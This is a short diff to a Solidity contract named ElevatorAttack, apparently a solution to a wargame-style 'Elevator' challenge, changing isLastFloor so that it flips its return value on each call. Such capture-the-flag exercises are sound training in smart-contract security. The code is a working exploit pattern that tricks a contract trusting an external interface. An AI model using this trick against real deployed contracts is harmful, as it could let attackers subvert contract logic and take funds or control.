@@ -5,7 +5,7 @@ import '../levels/Elevator.sol';
 contract ElevatorAttack {
   bool public isLast = true;
   
-  function isLastFloor(uint floor) view public returns (bool) {
+  function isLastFloor(uint) public returns (bool) {
     isLast = ! isLast;
     return isLast;
   }
